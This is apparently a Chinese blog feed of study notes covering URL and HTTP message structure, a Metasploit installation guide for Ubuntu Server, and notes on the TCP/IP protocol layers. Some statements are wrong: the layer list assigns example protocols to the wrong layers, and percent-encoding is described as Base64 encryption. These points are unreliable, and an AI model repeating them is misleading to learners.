<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="noopener">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a></p>
<p>从上面的URL可以看出，一个完整的URL包括以下几部分：</p>
<ul>
<li><p>1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
</li>
<li><p>2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
</li>
<li><p>3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
</li>
<li><p>4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
</li>
<li><p>5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
</li>
<li><p>6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
</li>
<li><p>7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
</li>
</ul>
<h1><span id="uri和url的区别">URI和URL的区别</span></h1><p>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。</p>
<p>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：</p>
<ul>
<li>①访问资源的命名机制</li>
<li>②存放资源的主机名</li>
<li>③资源自身的名称，由路径表示，着重强调于资源。</li>
</ul>
<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p>
<p>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：</p>
<ul>
<li>①协议(或称为服务方式)</li>
<li>②存有该资源的主机IP地址(有时也包括端口号)</li>
<li>③主机资源的具体地址。如目录和文件名等</li>
</ul>
<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。</p>
<p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
<h1><span id="http之请求消息request">HTTP之请求消息Request</span></h1><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
<p>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。<br>Get请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</span><br><span class="line">Host    img.mukewang.com</span><br><span class="line">User-Agent    Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</span><br><span class="line">Accept    image/webp,image/*,*/*;q=0.8</span><br><span class="line">Referer    http://www.imooc.com/</span><br><span class="line">Accept-Encoding    gzip, deflate, sdch</span><br><span class="line">Accept-Language    zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure>
<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.</p>
<p>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。</p>
<p>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息</p>
<p>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等</p>
<p>第三部分：空行，请求头部后面的空行是必须的</p>
<p>即使第四部分的请求数据为空，也必须有空行。</p>
<p>第四部分：请求数据也叫主体，可以添加任意的其他数据。</p>
<p>这个例子的请求数据为空。</p>
<p>POST请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line">Host:www.wrox.com</span><br><span class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:40</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure>
<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
<h1><span id="http之响应消息response">HTTP之响应消息Response</span></h1><p>一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。</p>
<p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 22 May 2009 06:07:21 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;&lt;/head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">            &lt;!--body goes here--&gt;</span><br><span class="line">      &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</p>
<p>第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</p>
<p>第二部分：消息报头，用来说明客户端要使用的一些附加信息</p>
<p>第二行和第三行为消息报头，<br>Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</p>
<p>第三部分：空行，消息报头后面的空行是必须的</p>
<p>第四部分：响应正文，服务器返回给客户端的文本信息。</p>
<p>空行后面的html部分为响应正文。</p>
<h1><span id="http之状态码">HTTP之状态码</span></h1><p>状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</p>
<p>1xx：指示信息–表示请求已接收，继续处理</p>
<p>2xx：成功–表示请求已被成功接收、理解、接受</p>
<p>3xx：重定向–要完成请求必须进行更进一步的操作</p>
<p>4xx：客户端错误–请求有语法错误或请求无法实现</p>
<p>5xx：服务器端错误–服务器未能实现合法的请求</p>
<p>常见状态码：</p>
<p>200 OK                        //客户端请求成功<br>400 Bad Request               //客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized              //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden                 //服务器收到请求，但是拒绝提供服务<br>404 Not Found                 //请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error     //服务器发生不可预期的错误<br>503 Server Unavailable        //服务器当前不能处理客户端的请求，一段时间后可能恢复正常<br>更多状态码<a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-status-codes.html</a></p>
<h1><span id="http请求方法">HTTP请求方法</span></h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<p>GET     请求指定的页面信息，并返回实体主体。<br>HEAD     类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>PUT     从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE      请求服务器删除指定的页面。<br>CONNECT     HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。<br>OPTIONS     允许客户端查看服务器的性能。<br>TRACE     回显服务器收到的请求，主要用于测试或诊断。</p>
<h1><span id="http工作原理">HTTP工作原理</span></h1><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<p>1、客户端连接到Web服务器</p>
<p>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="noopener">http://www.oakcms.cn。</a></p>
<p>2、发送HTTP请求</p>
<p>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
<p>3、服务器接受请求并返回HTTP响应</p>
<p>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
<p>4、释放连接TCP连接</p>
<p>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
<p>5、客户端浏览器解析HTML内容</p>
<p>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
<p>5、释放 TCP连接;</p>
<p>6、浏览器将该 html 文本并显示内容; 　　</p>
<h1><span id="get和post请求的区别">GET和POST请求的区别</span></h1><p>GET请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /books/?sex=man&amp;name=Professional HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure>
<p>注意最后一行是空行</p>
<p>POST请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure>
<p>1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p>
<p>POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据</p>
<p>因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变</p>
<p>2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。</p>
<p>而在实际开发中存在的限制主要有：</p>
<p>GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。</p>
<p>因此对于GET提交时，传输数据就会受到URL长度的 限制。</p>
<p>POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。</p>
<p>3、安全性</p>
<p>POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击</p>
<p>4、Http get,post,soap协议都是在http上运行的</p>
<p>（1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的<br>查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全</p>
<p>（2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。<br>但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。</p>
<p>（3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式<br>Content-type设置为: text/xml 任何数据都可以xml化。</p>
<p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.</p>
<p>我们看看GET和POST的区别</p>
<p>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中.</p>
<p>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</p>
<p>GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。</p>
<p>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.</p>
<p>原文地址：<a href="http://www.cnblogs.com/ranyonsue/p/5984001.html" target="_blank" rel="noopener">http://www.cnblogs.com/ranyonsue/p/5984001.html</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu Server下安装配置Metasploit]]></title>
      <url>https://uknowsec.cn/posts/notes/Ubuntu-Server%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="安装postgersql">安装postgersql</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install postgersql</span><br></pre></td></tr></table></figure>
<h1><span id="下载metasploit">下载Metasploit</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</span><br></pre></td></tr></table></figure>
<h1><span id="安装metasploit">安装Metasploit</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo mkdir metasploit</span><br><span class="line">sudo ./metasploit-latest-linux-x64-installer.run</span><br></pre></td></tr></table></figure>
<ul>
<li>在安装的过程中开始是license内容可以一直回车，然后输入y，同意license</li>
<li>然后会要你选择一个空文件夹，此时输入刚刚创建的文件夹 /opt/metasploit</li>
<li>最后还会让你选择是否metasploit自行创建postgersql，可输入y。等待即可安装成功</li>
</ul>
<h1><span id="启动metasploit">启动Metasploit</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start		//启动PostgreSQL服务</span><br><span class="line">service metasploit start		//启动Metasploit服务</span><br><span class="line">msfconsole		//启动Metasploit</span><br><span class="line">db_status		//查看数据库连接状态</span><br></pre></td></tr></table></figure>
<ul>
<li>如果启动metasploit的时候出现Warning提示没有查看datebase.yml的权限可以输入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 775 /opt/metasploit-framework/apps/pro/ui/config/database.yml</span><br></pre></td></tr></table></figure>
<ul>
<li>重新启动就可以自动连接数据库了</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[《TCP/IP详解 卷1：协议》学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/%E3%80%8ATCP-IP%E8%AF%A6%E8%A7%A3-%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="概述">概述</span></h1><h2><span id="分层">分层</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141924136983820.png" alt=""></p>
<ul>
<li>链路层：处理与电缆（或其他任何传输媒介）的物理接口细节（Telnet,FTP和e-mail等）</li>
<li>网络层：处理分组在网络中的活动，例如分组选路（TCP和UDP）</li>
<li>运输层：为两台主机上的应用程序提供端到端的通讯（IP,ICMP和IGMP）</li>
<li>应用层：处理特定的应用程序细节（设备驱动程序及接口卡）</li>
</ul>
<h2><span id="实例运行ftp的两台主机">实例：运行FTP的两台主机</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/142117348856117.png" alt=""></p>
<ul>
<li>大多数的网络应用程序都被设计成客户-服务器模式</li>
<li>双方都有对应的一个或多个协议进行通讯</li>
<li>应用程序通常是用户进程，而下三层一般在内核执行</li>
<li>应用层关心应用程序的细节，下三层对应用程序一无所知，但它要处理所有的通信细节</li>
</ul>
<h2><span id="通过路由器连接的两个网络">通过路由器连接的两个网络</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141953434648847.png" alt=""></p>
<ul>
<li>端系统（end system）（两边的两台主机）</li>
<li>中间系统（intermediate system）（中间的路由器）</li>
<li>应用层和运输层使用端到端（end-to-end）协议</li>
<li>网络层提供的是逐跳（hop-to-hop）协议</li>
<li>网络ip提供的是一种不可靠的服务，它只是尽可能快的把分组从源结点送到目的结点，但不提供可靠的运输层</li>
<li>互联网的目的之一就是在应用程序中隐藏所有的屋里细节</li>
</ul>
<h2><span id="tcpip协议族中不同层次的协议">TCP/IP协议族中不同层次的协议</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141957475736336.png" alt=""></p>
<ul>
<li>TCP使用不可靠的IP服务，并提供一种可靠的运输层服务</li>
<li>UDP为应用程序发送和接受数据报，和TCP不同，UDP是不可靠的。</li>
<li>IP是网络层上的主要协议，同时被TCP和UDP使用</li>
<li>ICMP是IP协议的附属协议</li>
<li>IGMP是Internet组管理协议。它用来把一个UDP数据报多播到多个主机</li>
<li>ARP（地址解析协议）和RARP（逆地址解析协议）是某些网络接口（如以太网和令牌环网）使用的特殊协议，用来转换IP层和网络接口层使用的地址。</li>
</ul>
<h2><span id="互联网的地址">互联网的地址</span></h2><p>互联网上的每个接口必须有一个唯一的Internet地址（也称作IP地址）。IP地址长32bit。IP地址具有一定的结构，五类不同的互联网地址格式如图1-5所示。<br><img src="http://images.cnitblog.com/blog2015/697266/201504/142010446984287.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/142010578707763.png" alt=""></p>
<p>说明：</p>
<ul>
<li><p>多接口主机具有多个IP地址，其中每个接口都对应一个IP地址。</p>
</li>
<li><p>有三类IP地址：单播地址（目的端为单个主机）、广播地址（目的端为给定网络上的所有主机）以及多播地址（目的端为同一组内的所有主机）。</p>
</li>
</ul>
<h2><span id="域名系统">域名系统</span></h2><p>在TCP/IP领域中，域名系统（DNS）是一个分布的数据库，由它来提供IP地址和主机名之间的映射信息。</p>
<h2><span id="封装">封装</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/142022372296370.png" alt=""></p>
<ul>
<li>以太网数据帧的物理特征是其长度必须在46~1500字节之间</li>
<li>以太网的帧首部也有一个16bit的帧类型域（ip,arp,rarp）</li>
<li>IP在首部中存放一个长度为8bit的数值，称作协议域（icmp,igmp,tcp,udp,esp,gre）。1表示为ICMP协议，2表示为IGMP协议，6表示为TCP协议，17表示为UDP协议</li>
<li>TCP和UDP都用一个16bit的端口号来表示不同的应用程序（ftp,telnet,http）</li>
</ul>
<h2><span id="分用">分用</span></h2><p>当目的主机收到一个以太网数据帧时，数据就开始从协议栈中由底向上升，同时去掉各层协议加上的报文首部。每层协议盒都要去检查报文首部中的协议标识，以确定接受数据的上层协议。这个过程称作分用。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/142028379795759.png" alt=""></p>
<h2><span id="客户-服务器模型">客户-服务器模型</span></h2><p>大部分网络应用程序在编写时都假设一端是客户，另一端是服务器，其目的是为了让服务器为客户提供一些特定的服务。服务分为两种类型：重复型和并发型。</p>
<h3><span id="重复型服务器">重复型服务器</span></h3><p>1）等待一个客户请求的到来。<br>2）处理客户请求。<br>3）发送响应给发送请求的客户。<br>4）返回1）步。</p>
<p>重复型服务器主要的问题发生在2）状态。在这个时候，它不能为其他客户机提供服务。</p>
<h3><span id="并发型服务器">并发型服务器</span></h3><p>1）等待一个客户请求的到来。<br>2）启动一个新的服务器来处理这个客户的请求。在这期间可能生成一个新的进程、任务或线程，并依赖底层操作系统的支持。这个步骤如何进行取决于操作系统。生成的新服务器对客户的全部请求进行处理。处理结束后，终止这个新服务器。</p>
<p>3）返回1）步。</p>
<p>并发服务器的优点在于它是利用生成其他服务器的方法来处理客户的请求。每个客户都有它自己对应的服务器。如果操作系统允许多任务，那么就可以同时为多个客户服务。</p>
<h2><span id="端口号">端口号</span></h2><ul>
<li>服务器一般都是通过知名端口号来识别的（ftp 21,telnet 23）</li>
<li>客户端端口号又称作临时端口号（即存在时间很短暂）</li>
<li>大多数TCP/IP实现给临时端口分配1024~5000之间的端口号</li>
<li>大于5000的端口号是为其他服务器预留的（Internet上并不常用的服务）</li>
</ul>
<h1><span id="链路层">链路层</span></h1><h2><span id="引言">引言</span></h2><p>从图1-4可以看出，在TCP/IP协议族中，链路层主要有三个目的：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/151053134953465.png" alt=""></p>
<ul>
<li>为IP模块发送和接收IP数据报；</li>
<li>为ARP模块发送ARP请求和接收ARP应答。</li>
<li>为RARP发送RARP请求和接收RARP应答。</li>
</ul>
<p>TCP/IP支持多种不同的链路层协议，这取决于网络所使用的硬件，如以太网、令牌环网、FDDI（光纤分布式数据接口）及RS-232串行线路等。</p>
<h2><span id="以太网和ieee-802封装">以太网和IEEE 802封装</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151227346352054.png" alt=""></p>
<h3><span id="以太网">以太网</span></h3><ul>
<li>以太网这个术语一般是指数字设备公司、英特尔公司和Xerox公司在1982年联合公布的一个标准</li>
<li>它采用一种称作CSMA/CD的媒体接入方法。</li>
<li>它的速率为10Mb/s，地址为48bit</li>
</ul>
<h3><span id="ieee-802封装">IEEE 802封装</span></h3><ul>
<li>802.3针对整个CSMA/CD网络</li>
<li>802.4针对令牌总线网络</li>
<li>802.5针对令牌环网络</li>
<li>这三者的共同特性由802.2标准来定义，那就是802网络共有的逻辑链路控制（LLC）</li>
</ul>
<h2><span id="封装格式">封装格式</span></h2><ul>
<li>两种帧格式都采用48bit(6字节)的目的地址和源地址</li>
<li>ARP和RARP协议对32bit的IP地址和48bit的硬件地址进行映射</li>
<li>802定义的有效长度值与以太网的有效类型值无一相同，这样就可以对两种帧格式进行区分</li>
<li>母的服务访问点（DSAP）和源服务访问点（SSAP）的值都设为0xaa。Ctr1字段的值设为3.随后的3个字节orgcode都置为0.再接下来的2个字节类型字段和以太网帧格式一样。</li>
<li>802.3规定数据分布必须至少为38字节，而对于以太网，则要求最少要有46字节。为了保证这一点，必须在不足的空间插入填充（pad）字节。</li>
</ul>
<h2><span id="slip串行线路ip">SLIP：串行线路IP</span></h2><p>SLIP的全称是Serial Line IP。它是一种在串行线路上对IP数据报进行封装的简单形式。SLIP适用于家庭中每台计算机几乎都有的RS-232串行端口和高速调制解调器接入Internet。下面的规则描述了SLIP协议定义的帧格式：</p>
<ul>
<li>IP数据报以一个称作END（0xc0）的特殊字符结束。同时，为了防止数据报到来之前的线路噪声被当成数据报内容，大多数实现在数据报的开始处也传一个END字符。</li>
<li>如果IP报文中某个字符为END，那么就要连续传输两个字节0xdb和0xdc来取代它。0xdb这个特殊字符被称作SLI的ESC字符。</li>
<li>如果IP报文中某个字符为SLIP的ESC字符，那么就要连续传输两个字节0xdb和0xdd来取代它。</li>
</ul>
<p>图2-2中的例子就是含有一个END字符和一个ESC字符的IP报文。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/151336240428797.png" alt=""></p>
<p>SLIP是一种简单的帧封装方法，值得一提的缺陷：</p>
<ul>
<li>每一端必须知道对方的IP地址。没有办法把本端的IP地址通知给另一端。</li>
<li>数据帧中没有类型字段（类似于以太网中的类型字段）。如果一条串行线路用于SLIP，那么它不能同时使用其他协议。</li>
<li>SLIP没有在数据帧中加上检验和（类似于以太网中的CRC字段）。如果SLIP传输报文被线路噪声影响而发生错误，只能通过上层协议来发现。</li>
</ul>
<p>尽管存在这些缺点，SLIP仍然是一种广泛使用的协议。</p>
<h2><span id="ppp点对点协议">PPP：点对点协议</span></h2><p>PPP点对点协议修改了SLIP协议中的所有缺陷。包括三个部分：</p>
<ul>
<li>在串行链路上封装IP数据报的方法。PPP既支持数据为8位和无奇偶检验的异步模式，还支持面向比特的同步链接。</li>
<li>建立、配置及测试数据链路的链路控制协议（LCP：Link Control Protocol）。它允许通信双方进行协商，以确定不同的选项。</li>
<li>针对不同网络层协议的网络控制协议（NCP：Network Control Protocol）体系。</li>
</ul>
<p>图2-3是PPP数据帧的格式。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/151400284327893.png" alt=""></p>
<ul>
<li>每一帧都以标志字符0x7e开始和结束。紧接着是一个地址字节，值始终是0xff，然后是一个值为0x03的控制字节。</li>
<li>协议字段，类似于以太网中类型字段的功能。当它的值为0x0021时，表示信息字段是一个 IP数据报；值为0xc021时，表示信息字段是链路控制数据；值为0x8021时，表示信息字段是网络控制数据。</li>
<li>CRC字段（或FCS，帧检验序列）是一个循环冗余检验码，以检测数据帧中的错误。</li>
<li>标志字符0x7e出现在信息字段中时，PPP需要对它进行转义。</li>
</ul>
